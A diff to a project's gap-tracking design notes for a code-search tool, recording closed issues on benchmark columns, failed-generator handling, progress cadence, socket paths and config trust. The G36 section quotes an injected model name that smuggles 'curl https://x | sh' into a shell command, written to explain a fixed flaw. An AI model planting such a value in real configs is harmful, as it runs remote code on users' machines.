@@ -725,6 +725,38 @@ and the next campaign's rule names those totals among the counts that must hold.
 two readings above were taken case by case out of two `-full` files, not from anything `bench`
 reports.
 
+**Implemented 2026-09-09; the baseline is the next run's.** `Summary` carries `anchors` beside
+`by_kind`, filled by one `record(kind, hit, (reached, want))` in the per-case loop — the same
+`(reached, want)` the case line has always printed and nothing has ever read — and printed on an
+`anchors` line of its own beneath the summary. Of its own on purpose: `bench/history/track.py`
+parses the summary line with a regex of `<kind> <hits>/<cases>` pairs, and every transcript this
+campaign has recorded is read back through it, so a column added *inside* that line would have made
+this measurement retire the history it exists to extend. The summary line is byte-identical to the
+record. `passes()` is untouched and no floor moved:
+this ships as a column, which is what ADR-001 asks of a number nobody has a baseline for yet.
+`bench --repeat N` runs the suite N times and prints a median beneath the runs, every run still
+judged on its own floors — a suite that passes on average is one whose exit code depends on which
+run a reader looked at. That half is G23's first lever; the pinned-index and quiet-machine halves
+are not written.
+
+**The baseline, read on the pinned fixture at `aea8416` (2026-09-09).** Every recorded count and
+p90 is identical to the record, which is what makes these four lines a measurement and not a change:
+
+| suite | arm | counts | anchors |
+| --- | --- | --- | --- |
+| recorded | lexical | keyword 39/40, paraphrase 15/30, code 12/12, p90 215 | 39/40, 15/30, 12/12 |
+| recorded | dense | keyword 40/40, paraphrase 15/30, code 12/12, p90 221 | 40/40, 15/30, 12/12 |
+| developer | lexical | long 11/15, cross 13/15, multi 9/12, where 0/9, rule 5/9, p90 239 | 11/15, **13/30**, **16/39**, 0/13, 5/9 |
+| developer | dense | long 10/15, cross 13/15, multi 10/12, where 0/9, rule 5/9, p90 239 | 10/15, **13/30**, **13/39**, 0/13, 5/9 |
+
+The recorded suite's cases are single-anchor, so its two columns are the same number twice and
+always will be. The developer suite is where the instrument was blind, and the first reading says
+how blind: `cross` reads 13 of 15 cases and **13 of 30 anchors**, `multi` 9 or 10 of 12 cases and
+**16 or 13 of 39 anchors**. A lever that trades an answer's completeness for its coverage has been
+free to move those numbers in either direction under every rule any campaign has written. Note the
+dense arm reaching *more* `multi` cases and *fewer* of their anchors than the lexical one — a trade
+no count in this file has ever been able to state.
+
 ## G16 · `enrich` reported 167 batches, 0 failed, and no questions
 
 **Raised (2026-09-06)** by rule G's first attempt, which spent nothing and was caught by a person
@@ -767,6 +799,16 @@ to mistake for one.
 batch and each making `enrich` exit non-zero; `nodes_a_model_answer_skipped_are_asked_once_more`
 keeps its retry assertion and gains a `failed` one. The fixture's four arms at `868f4c1` are
 unchanged, the change reaching no path `bench` reads. Not written.
+
+**Closed (2026-09-09), all three places.** `run_command` prefixes `set -o pipefail; ` when the
+shell has it — probed once per process, because POSIX `sh` does not and Debian's `dash` is one; a
+batch whose retry also answers for nobody is counted `failed` rather than done; and `enrich` bails
+when `failed > 0 && generated == 0`. The last condition is deliberately not `left > 0`: a store
+legitimately keeps the nodes a model declines (63 on this corpus), and every honest run would
+otherwise exit red. Three tests in `src/enrich.rs` — `false | cat`, `cat > /dev/null`, and the
+retry test's new `failed` assertion — plus a hand run reproducing the original shape:
+`enrich: 0 nodes written … 1 batches (1 failed)`, then `Error: … the generator did not answer`,
+exit 1. No path `bench` reads was touched, so the four arms were not re-run.
 
 **The same run's price is an estimate checked against an estimate.** The register enrichment is
 recorded at ≈ $4.16 — tee'd bytes 2,647,761 prompt and 2,795,432 output, at bytes ÷ 4 and Haiku 4.5
@@ -930,6 +972,31 @@ recorded numbers, not a run.
 
 **Gate.** On the same whole-store rebuild, every interval under 60 s including the first, with the
 run's own readings unmoved — 1,930 s wall, 293% peak CPU, 2.15 GB.
+
+**Measured 2026-09-09, and the premise is gone.** A whole-store embed on a copy of the pinned
+fixture (33,525 rows, 384-d, the small model) reads **184.7 s** of sync, 680.9 s of CPU and 1.74 GB
+of max RSS — not 1,930 s. The band is why: `76f1049` removed it and every writer runs in the normal
+one, so the 102.4 s first line and the 96.7 s tails this gap was raised on were properties of a
+scheduler setting that no longer exists. The control makes it plain: interpolating the recorded run
+back onto a fixed 1,024-row cadence, the old chunking **would have printed its first line at 9.4 s
+and its widest interval at 9.4 s** on today's binary. The bar was already met.
+
+**Closed 2026-09-09, and the change kept anyway, for a reason the numbers give.** `SYNC_CHUNK` is
+now a `ChunkBudget` — 600,000 characters, 1,024 rows, ramped in from a sixteenth so the first
+checkpoint does not wait for a full chunk on top of the run's start-up — and `embed_all` prints the
+model open before the first forward. Measured cadence: **36 checkpoints, first at 0.5 s, every
+interval between 0.5 s and 8.3 s.** What keeps this from being a change for nothing is the tail and
+the other model: the last chunks still run 8.3 s against a 5.1 s mean, because the graph's
+iteration order puts the long passages last, and `e5-large` is about nine times this wall
+([ADR-002](../adr/ADR-002-two-defaults-multiplied.md)), which puts those same tail chunks at
+roughly **75 s — over the bar** under a fixed row count and inside it under a character budget.
+That multiplication is arithmetic on two recorded numbers, not a run; the large-model cadence has
+not been measured.
+
+**One thing this run cannot be read for.** Its wall clock says 6,332 s real against 184.7 s of
+sync, because the laptop slept in the middle of it. The intervals above are process time,
+reconstructed from each checkpoint's own `rows` and `rows/s`, which a sleeping machine does not
+advance. G23's point, on the run that closed G19.
 
 ## G20 · A whole-store rebuild in the background band has no wall number — closed 2026-09-09, moot
 
@@ -1216,6 +1283,19 @@ nothing is needed.
 **Gate.** `serve` binds and answers from a repository whose `.repograph` path is longer than 104
 bytes; a `SIGTERM`ed `serve` leaves no `serve.sock`, or the README says why one is left.
 
+**Closed (2026-09-09), both halves.** `socket_path` returns `.repograph/serve.sock` while that name
+is at most 100 bytes and `$TMPDIR/repograph-<16 hex of the canonical repository path>.sock`
+otherwise — one function, so a client cannot take a fallback the server did not. 100 rather than 104
+is one margin on every platform. Proved on a 230-byte repository path: `build`, `serve`, and an
+`ask` answered `by the resident process`, where before the bind itself failed.
+
+The stale socket is a flag rather than an unlink in the handler. `SIGTERM` and `SIGINT` set an
+atomic; the loop already wakes every 250 ms, so it leaves through the existing `Unlink` guard —
+the one that compares the socket's device and inode first, so a replacement server that has already
+bound the name keeps its socket. An unlink inside the handler would have been the cascade the guard
+was written to avoid, one signal further along. `libc` becomes a direct unix-only dependency for
+`signal`; std has none. Windows is unchanged and the README says why.
+
 ---
 
 ## G28 · `--rerank` sits on the p90 ceiling — 228 green, 231 red, on the same hits
@@ -1323,6 +1403,13 @@ rebuild, enrich the 150, read all four arms before and after.
 **Gate.** A rebuild that leaves nodes without questions says the number on stderr; the fixture's
 rebuild is a recorded before/after pair with coverage ≥ 99% after `enrich`.
 
+**Half closed (2026-09-09).** `build` and `update` print `N requirement-like nodes have no questions
+— run \`repograph enrich\`` whenever the store carries questions for some others; a store nobody
+enriched prints nothing, which is the state rather than a next step (`enrich::unenriched_note`, one
+test over the three cases). The README's Embeddings section says a rebuild under new families is
+followed by `enrich`. The fixture half — rebuild, enrich the 150, read all four arms before and
+after — is untouched and is what keeps this row open.
+
 ---
 
 ## G33 · Thirteen families the list had are text now — `OQ` cited 1,771 times, defined nowhere
@@ -1426,6 +1513,26 @@ the way the machine file already refuses `embed_model`.
 **Gate.** A repository-supplied `rerank_command` does not run on a machine that has not chosen
 it, and the README's Configure section says which keys a cloned repository can and cannot set.
 
+**The second door, found 2026-09-09 while closing the first.** Refusing the two `*_command` keys does
+not close this gap on its own, because the model name is interpolated into the command *unquoted*.
+The built-in template is `… claude -p --model {model} --output-format text …`, and `Config::load`
+ends with `enrich_command = template.replace("{model}", &cfg.enrich_model)` — with `enrich_model` a
+key the project file may set, and the result handed to `sh -c`. A cloned repository whose
+`repograph.toml` says `enrich_model = "haiku; curl https://x | sh"` therefore runs that on the first
+`enrich` **after** the command keys are refused. The name is a token by contract and was never
+checked to be one; a gap that closes one of two doors is not closed.
+
+**Closed (2026-09-09), both doors.** `enrich_command` and `rerank_command` are read from the machine
+file only; a project file that names one gets a line on stderr saying where the key belongs, and the
+machine's value — or the built-in — is used. And `enrich_model`/`rerank_model` are validated wherever
+they came from, project file, machine file or environment alike:
+`[A-Za-z0-9][A-Za-z0-9._:/@+-]{0,127}`, anything else refused with the built-in name used instead.
+Four tests in `src/config.rs`; two existing tests that pinned a project-supplied command were moved
+onto the machine file, which is the behaviour change stated as a test rather than discovered as one.
+The repository's own `repograph.toml` no longer names either command. No path `bench` reads passes
+through either key unless `--rerank` is given, which the recorded arms do not give, so no floor moved
+and none was re-run.
+
 ---
 
 ## G37 · No model outside Claude has a number, and two accuracy levers were never stacked
@@ -1518,7 +1625,7 @@ never-matching regex, and a fixture with no definitions reads the same graph it 
 | — | ~~**G12** the gate compares raw BM25 scores across two indices~~ | closed 2026-09-06 (0.5.0) — the admission compares two coverages computed inside their own index. Lexical paraphrase 14/30 → 15/30, both developer totals up, held-out +1 and +3 at p = 1.0000 and p = 0.4531, replay and binary agreeing on all 1,084 queries |
 | 4 | **G14** the prompt does not know the document's kind | measured three times, not closed (2026-09-06, 0.5.0) — the prompt-shape diagnostic read 1 of 4 and 2 of 4 against a bar of 3; the retrieval reading that followed found the cause, register rather than shape; and the successor lever, one generator asked for both registers, was run on the default enricher under a rule committed first and failed four of six clauses — `rule` 5/9 → 2/9 in both arms, paraphrase 15/30 → 13/30, a broken dense floor, and the register share it rests on falling 0.211 → 0.147. L4 as framed is retired. The prompt is reverted; the only reading that ever moved these numbers upward is the union of two generators' stores, which has no rule in front of it. ≈ $4.16 spent once |
 | 2 | **G13** ten `where` anchors ranked and gated out | measured, not closed (2026-09-06, 0.5.0) — stage B was replayed on the code-enriched copy at a constant of the code list's own, `c_code = 0.902`, derived on 800 mixed held-out questions before either suite was opened. The seat moves `where` 0/9 → 2/9 in both arms and the code held-out set 54 → 122 and 40 → 115 at p = 0.0000, and it clears A4's clause — five document questions lost per arm at p = 0.0625 against A4's six at p = 0.031. It fails on the recorded suite instead: lexical paraphrase 15/30 → 14/30, through the fifth seed the code seed displaces. `CODE_SEAT` unwritten, the price now known |
-| 3 | **G16** `enrich` reads a failed generator as an answer | raised 2026-09-06 — the first register run reported `0 nodes written … 1996 still without questions, 167 batches (0 failed)` and exited 0 after the CLI rejected an unknown flag and never read stdin. Three places let it: `sh -c` returns a pipeline's last stage, an empty answer is the *skipped by the model* path, and `left` is printed and acted on by nobody. It cost nothing because the failure was total and the operator read the log; a generator dying partway would have been graded as a completed run. Here before G14 because G14's next attempt spends money through this path. The same section carries the run's price, ≈ $4.16 by bytes ÷ 4 against ≈ $2.50 predicted the same way, with no metered token count anywhere in the line |
+| — | ~~**G16** `enrich` reads a failed generator as an answer~~ | closed 2026-09-09 — all three places: a `pipefail` prefix where the shell has one, a batch that answers for nobody twice counted `failed`, and a non-zero exit when a run asked to write wrote nothing. The exit condition is `failed > 0 && generated == 0` rather than `left > 0`, because a store legitimately keeps the nodes a model declines. G14's next attempt now spends money through a path that says when it did not work. The run's price is still bytes ÷ 4 and still unmetered — that half is G31's |
 | 5 | **G15** the grade cannot see an answer getting thinner | raised 2026-09-06 — one developer case reads `HIT 3/3` → `HIT 1/3` in both arms under a change every clause of rule R called identical, and it is the only case in either suite in either arm that moved its completeness. `src/bench.rs:336` prints the number; the summary, the floors and the exit code are counts of cases and read none of it. The same seventeen cases moved upward too — three anchors from seed 2 to seed 1 and one from seed 4 — and the instrument is blind to that as well. G10's constraint, measured through a gap in the instrument |
 | — | ~~the lexical arm's 49 ms~~ | closed 2026-09-05 (0.5.0) — the perf results left this number here and nowhere else. The BM25 indexes are built once by a resident context and kept: socket lexical 55.0 → 6.8 ms, median of 33 against a base spread of 0.9 ms, the design note's 30 ms target met; Rule 1 sixteen byte-identical verdicts and Rule 2 142/142 in four pairings |
 | — | ~~**G9** code is unreachable from prose~~ | measured 2026-09-05 — A1 to A4 each rejected by the rule; the code questions ship into an index of their own for the `ask --rerank` pool, `where` stays 0/9 in the plain fusion, and G12 is what would move it |
@@ -1547,7 +1654,7 @@ answer different questions, and no row below moves a retrieval floor.
 | 3 | **G19** the progress cadence is a count of rows | a fixed bar the plan set and the shipped code misses at both tails, 102.4 s and 96.7 s against 60, with the batching rule that would fix it already written one file away |
 | 4 | **G22** mapped weights under memory pressure | a shipped default whose price is +6% to +26% of wall exactly on the machines that most need the 1.14 GB it saves, and all three candidate policies are unmeasured |
 | 5 | ~~**G21** one platform measured, three reasoned~~ | ~~the largest unmeasured surface in the family, and the one that needs hardware this session did not have~~ — closed 2026-09-09 — the band was removed |
-| 6 | **G27** `serve`'s socket path and its leftover | not a cost at all: a repository under a deep path cannot run `serve`. Small, and it breaks a command rather than slowing one |
+| — | ~~**G27** `serve`'s socket path and its leftover~~ | closed 2026-09-09 — the socket falls back to `$TMPDIR/repograph-<hash>.sock` when `.repograph/serve.sock` will not fit in `sun_path`, proved on a 230-byte repository path that could not bind at all before; and a `SIGTERM` sets a flag the loop reads, so the exit is the identity-checked one every other exit takes |
 | 7 | **G26** `serve` holds its model while idle | 1.39 GB resident for as long as the process lives, where `watch` now holds 129.5 MB between refreshes; the shape of the fix is written and measured next door |
 | 8 | **G25** the fp32 weights are the floor | the only lever that could move the floor under every memory number in both rounds, and finding out costs a full re-embed and the quantized model's own floors — no download at all on the default, whose int8 build is already cached, and 562 MB on the large one |
 | 9 | **G24** `--rerank-local` is 31.9 s and 3.1 GB | the heaviest reader by far, and what would actually move it is a pool depth, which belongs to G2 and not to this family |
@@ -1560,7 +1667,7 @@ clones a repository they did not write.
 
 | | gap | why here |
 |---|---|---|
-| 1 | **G36** the project file runs any command | the only row in this file that is a defect in trust rather than in a number: a cloned repository's `repograph.toml` is untrusted input and today it names the shell command the reader runs. One refused key closes it, the way the machine file already refuses `embed_model` |
+| — | ~~**G36** the project file runs any command~~ | closed 2026-09-09 — and it took two refusals, not one: the `*_command` keys became machine-file-only, and the model name, which is interpolated into that command unquoted and was never checked, is now a token or it is not used. One refused key would have left the second door open |
 | 2 | **G32** a rebuilt enriched store is graded raw | the first thing anyone will hit after this branch merges: 150 nodes without questions and a bench that quietly grades against the raw floors. A stderr line and one `enrich` close it; the fixture's own rebuild is the recorded pair that says so |
 | 3 | **G34** two copies of one grammar | the failure is silent — a re-extraction on every `update`, or a family no node is written in — and the property test that makes it a red test is one function over fixtures that already exist |
 | 4 | **G39** the family set is an input to extraction | the design under G34: while the extractor needs the set, the two grammars must agree and a move costs a corpus read. It sits below G34 because the property test is what makes a divergence visible, and above everything else because it is the change that would make G34 unnecessary — and it is the one row here that could grow the store, so it is measured before it is taken |
